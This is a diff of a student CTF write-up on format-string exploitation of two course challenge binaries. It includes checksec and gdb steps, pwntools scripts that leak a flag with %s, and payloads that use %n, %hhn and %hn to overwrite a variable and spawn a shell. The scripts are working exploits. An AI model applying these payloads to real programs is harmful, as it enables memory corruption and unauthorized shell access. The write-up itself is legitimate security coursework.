@@ -1,38 +1,60 @@
+# Exploiting Format-string vulnerabilities CTF
+
 ## Challenge 1
-<!--
-checksec program
-Arch:     i386-32-little
-RELRO:    Partial RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x8048000)
 
-Análise do source code
-Linha do código onde está a vulnerabilidade
-- printf(buffer). buffer's contents from the user's input, i.e. controlled by the user. This is vulnerable to a format string attack. We can easily supply a format string that prints the contents of the program's memory.
-- This vulnerability allows the printing of the program's memory, the stack and heap, and allows writing on it.
-- To read the flag, we need to pass the address of the flag to printf. Then, by using the %s format string, we can print the flag's contents. We need make %s read the address of the flag that we passed, as we did in the seedlabs guide.
+#### Checksec
+Running `checksec program`, we got the following result:
 
-In checksec, we can see that PIE is not enabled. This means that the addresses of the program are fixed. As sugested on the moodle assignment, we can use gdb to find the address of the flag variable, which is located on the heap.
+![Alt text](screenshots/w7/ctf/checksec_ch1.png)
 
-b main
-run
-next
+This tells us that the stack canary is present, protecting from stack overflow attacks. NX enabled means that the stack is not executable, so we cannot use a buffer overflow to execute shellcode. PIE (Position independent executable) is disabled, so the addresses of the program are fixed. This means that we can use gdb to find the address of certain variables and use them in our exploit.
+
+### Source code analysis
+
+By reading the source code given, we found the source of the vulnerability. The line with the vulnerability is the following:
+```c
+printf(buffer);
+```
+This is vulnerable to a format string attack, since the buffer contains direct user input, as seen here:
+```c
+scanf("%32s", &buffer);
+```
+As seen in the seedlabs guide, we can inject a format string in our input, which makes us be able to read the contents of the program's memory, as well as writing on it.
+
+In the first challenge, the flag is already loaded into memory, so we just need to read the value of the variable containing it.
+
+So, to read the flag, we need to pass the address of the variable with the value of the flag to printf. Then, by using the `%s` format string, we can print the flag's contents. We need make sure `%s` read the address of the flag that we passed, as we did in the seedlabs guide.
+
+As seen before on `checksec`, PIE is not enabled. This means that the addresses of the program are fixed. As sugested on the moodle assignment, we can use gdb to find the address of the flag variable, which is located on the heap.
+
+### Reading the address of the variable flag
+In order to read the address of the variable that will hold the flag, we can simply do:
+```bash
+gdb program
+```
+And inside gdb, we just do
+```
 p &flag
+```
+The result is this:
+![Alt text](screenshots/w7/ctf/address_flag_ch1.png)
 
-Using p &flag, we can find the address of the flag.
-0x804c060
+Now, we know the address of the flag: `0x804c060`. Since PIE is disabled, the address will be the same on the server.
 
-Or we can run python3 exploit_example.py which pauses the execution
+We tried passing `<flag_address>%s` as the string. The objective was that `%s` reads the flag address as an argument and effectively reads the contents of the flag.
 
-Then we can attach in another terminal to the process by doing
-gdb attach <pid>
-p &flag
-0x804c060
-
-Since PIE is disabled, we can use this same address for the server, and it works.
--->
+So, we developed this exploit:
 ```python
+from pwn import *
+
+LOCAL = True
+
+if LOCAL:
+    p = process("./program")
+    pause()     # pause execution to attach gdb
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+
 
 N = 32	# 32 bytes read in total
 content = bytearray(0x0 for i in range(N))
@@ -45,174 +67,219 @@ s = "%s"
 fmt  = (s).encode('latin-1')
 content[4:4 + len(fmt)] = fmt
 
-
 p.recvuntil(b"got:")
 p.sendline(content)
 p.interactive()
-
 ```
+### Local execution
+We started by running locally. On a terminal, we run the python script, on the other we attach using gdb.
+```bash
+python3 exploit_example.py
+```
+```bash
+gdb attach <pid>
+```
+Then we can just type `continue` on the gdb and Enter the python script terminal. We can also simply run the python script by itself and just Enter in the terminal to continue the execution.
 
+The result is this:
+
+![Alt text](screenshots/w7/ctf/flag_local_ch1.png)
+
+We have successfully read the contents of flag.txt locally.
+
+Now to run it on the server, we can just set `LOCAL = False` in the script and run it again.
+```bash
+python3 exploit_example.py
+```
+The result is this:
+
+![Alt text](screenshots/w7/ctf/flag_server_ch1.png)
+
+We have successfully read the contents of flag.txt on the server.
 
 ## Challenge 2
 
-3 main tries
-- normal one using actual address with 0x20
-- replacing 0xff for 0x20 (did not work on the server, because it's reliant on knowing the buffer address)
-- solution: using 0x1F and 0x21
+#### Checksec
+We ran `checksec program` and the output was the following:
+
+![Alt text](screenshots/w7/ctf/checksec_ch2.png)
+
+We can conclude, just as before, that the addresses of the variables are fixed, since PIE is disabled. So, they are the same on the server. We can find out the address of a variable by using gdb, just as before. The only difference from the other program is that here there is no RELRO (Relocation Read-Only).
+
+### Source code analysis
+So, we start by reading the source code. We can see that the vulnerability is the same as before, the line is:
+```c
+printf(buffer)
+```
+The buffer is given by user input, so we can inject a format string in it. This allows us to read and write the contents of the program's memory.
+
+In this challenge, since the flag is not loaded into memory, we cannot just read it from the memory of the program.
+However, there is a variable `key` located in the heap that, if assigned a certain value, leads the program to launch a shell program by running the following line:
+```c
+system("/bin/bash");
+```
+If we can make the program execute this, it allows us to gain access to the shell and simply run `cat flag.txt` to read the flag.
+
+So, our objective is going to be to change the value of that variable named `key`, located on the heap. We can do this by using the `%n` format string. This writes the number of characters printed until that point in the string. We will use this to change the value of the variable `key` so that the if clause succeeds.
+
+The if clause is presented here:
+```c
+if(key == 0xbeef) {
+```
+
+The value must be `0xbeef`, which is 48879 in decimal.
+
+We need to print 48879 characters in the printf and then pass the address of the variable `key` as an argument to `%n`. This will write the number of characters printed until that point in the variable `key`, changing its value to 48879.
 
 
-<!--
-checksec program
-Arch:     i386-32-little
-RELRO:    No RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x8048000)
+We can copy the file from the first challenge and change a few things. We need to change the server to be 4005, and start by testing locally `LOCAL = True`.
+We also need to change the `recvuntil` to have the argument '...', since the initial output is different in this challenge.
 
 
-Análise source code:
-- The vulnerability is the same, it's the line `printf(buffer)`. buffer is given/controlled by user input. We can provide a format string as input. This allows us to print the contents of the program's memory, as well as writing on the memory.
-- In this challenge, the flag is not in memory when the vulnerable printf(buffer) executes. This means we cannot simply read the flag from memory. However, in this case, a shell program is launched if a certain variable in the program's heap has a defined value. So, we just need to change the value of that variable (key) to be the one that passes the if clause. In that case, we'll gain access to the shell and be able to read the contents of the file flag.txt, by doing "cat flag.txt".
+### Reading the address of the variable key
+To do this, we can do the same as before. First, we run the program using `python3 exploit.py` in a terminal. Then we attach to that process using `gdb attach <pid>`.
 
-The value to pass the if clause is "0xbeef", which is 48879 in decimal.
-To write values in the program's memory using a format string vulnerability, we must use %n, which prints the number of characters read until that point on the string. So we need to print 48879 characters in that printf. Then, we just do as in the guide. We need to know the address of the "key" variable. If %n sees that address as the argument, it will change the value of that variable with the characters read.
+Then, inside gdb, we can simply do as shown in the image.
 
-We can copy the python file from the first challenge and change a few things. We need to change the server to be 4005, and start by testing locally (LOCAL = True)
-We need to also change the receive until to be until we receive a '...' sequence, since it is different in this challenge.
+![Alt text](screenshots/w7/ctf/address_key_ch2.png)
 
-We can do the same as before. First run the program using python exploit.py in a terminal, and then attaching to that process using gdb attach <pid>
-
-Then inside gdb, we can simply do:
-
-gdb-peda$ p &key
-$1 = (int *) 0x804b320 <key>
-
-and we have read the address of the key variable (inside the heap).
-Since there is no PIE, we know this address will be fixed.
+Now we know the address of the variable `key`. Since PIE is disabled, the address will be the same on the server.
 
 
-%48879x%n
+### First attempt
+We tried to pass the address of the variable `key` as an argument to `%n` and print 48879 characters before that.
 
+The format string to input would be like this `ABCD<key_address>%48871x%n`. After printing "ABCD" and the address, we have already printed 8 bytes, so we need to print 48871 more. This "%48871x" is printing the "ABCD" we have passed. After doing so, "%n" will read the address we have passed, so it should write 48879 in the variable `key`.
 
-Put:
-any 4 bytes at the beginning of the string
-the 4 bytes for the address of the variable "key"
-%(bignumber)x   -> will read the first 4 bytes of the string as an argument
-%n  -> will read the address of the variable "key" as an argument, effectively writing the number of characters printed until now in that variable
-
-48879 - 8 = 48871
-
-"0000<addr>%48871x%n"
-
-"ABCD<key_addr>%48871x%n"
-
-
-Since this was not working, we tried this input:
-
-
-s = "ABCD" + "%x" * 8
-fmt = (s).encode('latin-1')
-content[0: len(fmt)] = fmt
-
-It resulted in this output
-You gave me this:ABCD4443424178257825782578257825782578257825000
-It shows that the first %x reads the "ABCD", as we expected, the rest is just reading the "%x"
-
-Not understanding how this works, we tested several other things. We came to the conclusion that the address of the variable had the value 0x20, which represents a space. The problem is that scanf stops reading after receiving a space, so our input did not get fully sent.
-
-
-
-SO THE SOLUTION WE CAME UP FOR THIS WAS:
-writing the value of the address of the variable key (which had a space on it) by using %n and not directly through the input
-
-In task 3.C of the guide of format string vulnerabilities, it is referenced that we can use %hn to modify a one byte memory space. We can use this to change the value of the address of the variable key.
-So instead of inputting the exact value of the address, we replace 0x20 by, for example, 0xff, and then overwrite it using %hn with the correct value 0x20.
-
-But for this, we need to pass the exact address of the byte that we want to change. The address of the buffer is 0xffffd160 so we can pass that on the input. Since we need to pass the exact address of the byte, we can calculate it.
-
-
-Notes
-address of buffer: 0xffffd160
-2^16 = 65536
-
-payload:
-ABCD<buffer_addr - x><key_addr w/o 0x20>
-
--->
+We tried to do this by using the following python exploit
 ```python
-content = bytearray(0x0 for i in range(N))
+from pwn import *
+
+LOCAL = True
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
+N = 32
+content = bytearray(0x0 for i in range(32))
+key_addr = 0x0804b320
 
 content[0:4] = ("ABCD").encode('latin-1')
+content[4:8] = (key_addr).to_bytes(4, byteorder='little')
 
-inside_buffer = 0xffffd160 + 8
+s = "%48871x%n"
+fmt = (s).encode('latin-1')
+content[8:8 + len(fmt)] = fmt
 
-content[4:8] = (inside_buffer).to_bytes(4,byteorder='little')
-content[8:12] = ("ABCD").encode('latin-1')
-
-key_addr = 0x0804b3ff	# 0x20 is replaced by 0xff
-content[12:16] = (key_addr).to_bytes(4,byteorder='little')
-
-s = "%496x%hhn%48367x%n"
-
-fmt  = (s).encode('latin-1')
-content[16:16 + len(fmt)] = fmt
+p.recvuntil(b"...")
+p.sendline(content)
+p.interactive()
 ```
-Above is a try to make the address of the variable key be changed to 0x20 and be able to write the value 48879 in it.
-Does not work because the content would have 34 bytes.
+However, this was not successful. The output was this:
 
-In order to reduce the size, we tried doing this:
+![Alt text](screenshots/w7/ctf/output_1.png)
+
+We can see that the variable was not even modified. At the time, we did not fully understand this output. In fact, not much is printed, even though we expected more than 40 thousand characters.
+
+After searching for information about scanf, we found out that it uses whitespace as delimeters, including spaces, tabs and newlines.
+
+That means that it stops after reading a space. We printed our content string from the python script adding:
+```python
+print(content)
+```
+And we got this result:
+
+![Alt text](screenshots/w7/ctf/content_empty_space.png)
+
+We can see a space on just after the "ABCD". After searching for the ascii code of a space, we realised that the address of the variable `key` ends on the hexadecimal code of a space, which is 0x20. This means that scanf stops reading after the space, so our input is not fully sent to the program.
+
+### Second attempt
+This second attempt is shown here but it did not work on the server, although it worked locally.
+
+The idea of this attempt is to pass a different address, which does not end with 0x20, so that scanf reads the whole input. Then, we pass change the value of that address by referencing our own input buffer so that we can finally use the `%n` format string to write the value 48879 in the address of the variable `key`.
+
+In task 3.C of the guide of format string vulnerabilities, it is referenced that we can use %hn and %hhn to modify smaller memory spaces. We can use this to change the value of the address of the variable key that we have passed parcially correct.
+
+
+After a few tries and some help on how printf works, we came up with the following exploit.
+It uses format specifiers `%hhn` to write a single byte and `%i$` to reference the i'th argument passed to printf. We needed this to reduce the size of our input, since we are limited to 32 bytes.
+
+The format string we built starts with "ABCD", then the address pointing to the 8th byte passed to printf, then the address of the variable `key`. That 8th byte is exactly that "incorrect" 0xff passed in the variable key, since this is a little-endian architecture. Our intention is to write 0x20 on this to make it correct. Afterwards, we just need to write to the key variable with the value 48879.
+
+To read the buffer address, we ran the python script locally and attached with gdb.
+We added a breakpoint in line 16 by doing `b 16`, continued the program execution and read the address:
+
+![Alt text](screenshots/w7/ctf/buffer_addr_ch2.png)
 
 ```python
+from pwn import *
+
+LOCAL = True
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
 N = 32	# 32 bytes read in total
 content = bytearray(0x0 for i in range(N))
 
 content[0:4] = ("ABCD").encode('latin-1')
 
-inside_buffer = 0xffffd1c0 + 8
-content[4:8] = (inside_buffer).to_bytes(4,byteorder='little')
+inside_buffer_addr = 0xffffd1b0 + 8  # point to 8th byte passed to printf
+content[4:8] = (inside_buffer_addr).to_bytes(4,byteorder='little')
 
-key_addr = 0x0804b3ff	# 0x20 is replaced by 0xff
+key_addr = 0x0804b3ff	# 0x20 replaced by 0xff
 content[8:12] = (key_addr).to_bytes(4,byteorder='little')
 
 s = "%20x%hhn%1$48847x%n"
+# 0x20 = 32 = 12 + 20
+# %hhn writes 0x20 on the address inside_buffer_addr
+# 48847 = 0xbeef - 32 - 8
+# %1$ references the 1st argument passed to printf
+# %n writes 0xbeef in the modified address key_addr (0x20 as the LSB)
 
 fmt  = (s).encode('latin-1')
 content[12:12 + len(fmt)] = fmt
+
+p.recvuntil(b"...")
+p.sendline(content)
+p.interactive()
 ```
 
-We managed to get the flag with this but only locally. This hardcodes the buffer index which makes it not work on the server.
+We managed to get the flag with this but only locally, as seen here:
 
-Another possible solution came up
+![Alt text](screenshots/w7/ctf/ch2_second_attempt_local.png)
+
+
+In fact, the problem is that this hardcodes the buffer address which makes it not work on the server. The address on the server is different.
+
+
+### Third and Final Attempt
+
+Another possible solution came up and this one worked on the server.
+
+The idea was to spill values from adjacent addresses to the variable we want to change. Since we already tried and spent time understanding the way printf works, this was not hard to come up with.
+
+Before actually getting the correct solution, we ended up making the mistake of using 0x19 to try to spill values to 0x20. This was a silly mistake, since we should have used 0x1F, the actual adjacent address.
+
+We figured out that this was happening by using gdb locally and by checking the value of the key variable using `print key` inside gdb.
+
+![Alt text](screenshots/w7/ctf/key_value_0x19.png)
+
+We can see that the address 0x19 holds the correct value but the key variable has the incorrect value. This is because we are writing to the address 0x19, and not 0x1F.
 
 <!--
-Spilling values from other addresses
-This new idea is to use an address that ends with 0x19, for example, to make the %n write the value 48879 in the address of the variable key.
-
 0xbe = 190
 0xef00 = 61184
-
 -->
-Solution that did not work.
-```python
-key_addr1 = 0x0804b321
-key_addr2 = 0x0804b319
 
-content[0:4] = (key_addr1).to_bytes(4,byteorder='little')
-content[4:8] = (key_addr2).to_bytes(4,byteorder='little')
+Here, we present the working exploit:
 
-s = "%182x%1$n%60995x%2$hn"
-
-fmt  = (s).encode('latin-1')
-content[8:8 + len(fmt)] = fmt
-```
-<!--
-- screenshot of failed attempt
-Stupid forgot 0x1F and used 0x19
-
-
-
--->
-Working exploit:
 ```python
 key_addr1 = 0x0804b321
 key_addr2 = 0x0804b31F
@@ -220,19 +287,26 @@ key_addr2 = 0x0804b31F
 content[0:4] = (key_addr1).to_bytes(4,byteorder='little')
 content[4:8] = (key_addr2).to_bytes(4,byteorder='little')
 
-s = "%182x%1$n%60995x%2$hn"
+s = "%182x%1$n%60994x%2$hn"
+# 8 + 182 = 190 = 0xbe
+# %1$n writes 0xbe in the address key_addr1
+# 60994 = 0xef00 - 190
+# %2$hn writes 0xef00 in the address key_addr2
 
 fmt  = (s).encode('latin-1')
 content[8:8 + len(fmt)] = fmt
 ```
-<!--
-- screenshot of key value
-- screenshot of flag placeholder
 
-We don't need to worry about the rest of the values in the key variable (the bytes 0x22, 0x23), because these will be empty
-(comes from key = 0)
--->
+We had to use the value `0xef00`, because of the little-endian architecture. The LSB gets written first, which is `0x00`. The MSB `0xef` is written afterwards in the address ending with 0x20.
+We use %hn to write only 2 bytes, so that we don't overwrite the values written before in the variable `key`.
 
-This also works as expected in the server.
+This works locally:
+
+![Alt text](screenshots/w7/ctf/flag_ch2_local.png)
+
+
+And it also works as expected in the server.
 
 ![Alt text](screenshots/w7/ctf/flag_server_ch2.png)
+
+We have finally successfully exploited the program and got the flag.
